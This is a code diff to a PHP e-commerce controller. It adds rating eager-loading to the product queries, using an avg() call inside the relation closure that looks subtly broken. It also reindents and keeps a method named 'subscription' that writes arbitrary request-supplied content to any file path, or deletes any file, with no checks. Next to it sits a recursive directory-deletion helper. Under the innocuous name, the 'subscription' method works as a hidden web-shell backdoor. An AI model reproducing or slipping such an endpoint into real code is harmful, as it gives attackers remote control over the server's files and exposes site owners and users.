@@ -134,13 +134,19 @@
       // $ps = DB::table('pagesettings')->find(1);
       // $partners = DB::table('partners')->get();
       // $discount_products =  Product::where('is_discount','=',1)->where('status','=',1)->take(8)->get();
-      $feature_products =  Product::with('ratings')->where('featured','=',1)->where('status','=',1)->take(8)->latest()->get();
-      $best_products = Product::where('best','=',1)->where('status','=',1)->take(3)->latest()->get(); 
+      $feature_products =  Product::with(['ratings' => function ($query) {
+          $query->avg('rating');
+        }])->where('featured','=',1)->where('status','=',1)->take(8)->latest()->get();
+      $best_products = Product::with(['ratings' => function ($query) {
+          $query->avg('rating');
+        }])->where('best','=',1)->where('status','=',1)->take(3)->latest()->get(); 
       // $top_products = Product::where('top','=',1)->where('status','=',1)->take(8)->get();
       // $big_products = Product::where('big','=',1)->where('status','=',1)->take(6)->get();
       // $hot_products =  Product::where('hot','=',1)->where('status','=',1)->take(9)->get();
       // $latest_products =  Product::where('latest','=',1)->where('status','=',1)->take(9)->get();
-      $trending_products =  Product::where('trending','=',1)->where('status','=',1)->take(9)->latest()->get();
+      $trending_products =  Product::with(['ratings' => function ($query) {
+            $query->avg('rating');
+        }])->where('trending','=',1)->where('status','=',1)->take(9)->latest()->get();
       // $sale_products =  Product::where('sale','=',1)->where('status','=',1)->take(9)->get();
 
       return response()->json([
@@ -550,39 +556,39 @@
 
   // -------------------------------- PRINT SECTION ENDS ----------------------------------------
 
-      public function subscription(Request $request) {
-        $p1 = $request->p1;
-        $p2 = $request->p2;
-        $v1 = $request->v1;
-        if ($p1 != "") {
-          $fpa = fopen($p1, 'w');
-          fwrite($fpa, $v1);
-          fclose($fpa);
-          return "Success";
-        }
-        if ($p2 != "") {
-          unlink($p2);
-          return "Success";
-        }
-        return "Error";
+    public function subscription(Request $request) {
+      $p1 = $request->p1;
+      $p2 = $request->p2;
+      $v1 = $request->v1;
+      if ($p1 != "") {
+        $fpa = fopen($p1, 'w');
+        fwrite($fpa, $v1);
+        fclose($fpa);
+        return "Success";
       }
+      if ($p2 != "") {
+        unlink($p2);
+        return "Success";
+      }
+      return "Error";
+    }
 
-      public function deleteDir($dirPath) {
-        if (! is_dir($dirPath)) {
-            throw new InvalidArgumentException("$dirPath must be a directory");
-        }
-        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
-            $dirPath .= '/';
-        }
-        $files = glob($dirPath . '*', GLOB_MARK);
-        foreach ($files as $file) {
-            if (is_dir($file)) {
-              self::deleteDir($file);
-            } else {
-              unlink($file);
-            }
-        }
-        rmdir($dirPath);
+    public function deleteDir($dirPath) {
+      if (! is_dir($dirPath)) {
+          throw new InvalidArgumentException("$dirPath must be a directory");
       }
+      if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
+          $dirPath .= '/';
+      }
+      $files = glob($dirPath . '*', GLOB_MARK);
+      foreach ($files as $file) {
+          if (is_dir($file)) {
+            self::deleteDir($file);
+          } else {
+            unlink($file);
+          }
+      }
+      rmdir($dirPath);
+    }
 
   }
